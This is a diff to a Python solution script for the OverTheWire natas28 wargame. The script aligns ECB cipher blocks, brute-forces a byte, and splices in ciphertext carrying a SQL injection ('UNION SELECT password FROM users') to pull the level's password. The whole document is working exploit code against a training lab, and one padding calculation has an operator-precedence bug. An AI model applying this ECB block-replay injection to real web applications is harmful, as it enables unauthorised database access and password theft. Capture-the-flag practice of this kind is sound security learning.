@@ -13,6 +13,8 @@ for query_length in range(50):
   query = base64.b64decode(requests.utils.unquote(response.url[60:]))
   print("query length: %s, response length: %s" %(query_length, len(query)))
 
+block_size = 16
+
 # determine query length for equal block 2 is 9 + 1
 # determine match b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb'
 for query_length in range(50):
@@ -24,11 +26,12 @@ for query_length in range(50):
     print("block number %s: %s" %(block_number, query[block_number * 16:(block_number * 16) + 16]))
   print("")
 
+# determine unencrypted last character of block 2
 match = b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb'
 for character in string.printable:
   response = requests.get(url, auth=auth, params=[("query", "a" * 9 + character)])
   query = base64.b64decode(requests.utils.unquote(response.url[60:]))
-  block2 = query[2 * 16:(2 * 16) + 16]
+  block2 = query[2 * block_size:3 * block_size]
   if block2 == match:
     print("correct character: %s" %(character))
     break
@@ -36,4 +39,20 @@ for character in string.printable:
     print("wrong character: %s" %(character))
 
 # replay attack
+# select text from jokes where text like '%$foo%'
 injection = "a" * 9 + "' UNION SELECT password FROM users; #"
+injection_blocks = int((len(injection) - 10) / 16)
+if len(injection) - 10 % 16 != 0:
+  injection_blocks += 1
+
+response = requests.get(url, auth=auth, params=[("query", injection)])
+raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))
+
+response = requests.get(url, auth=auth, params=[("query", "a" * 10)])
+good_base = base64.b64decode(requests.utils.unquote(response.url[60:]))
+
+query = good_base[:block_size * 3] + raw_inject[block_size * 3:block_size * 3 + injection_blocks * block_size] + good_base[block_size * 3:]
+query = base64.b64encode(query)
+url = "http://natas28.natas.labs.overthewire.org/search.php"
+response = requests.get(url, auth=auth, params=[("query", query)])
+print(response.text)
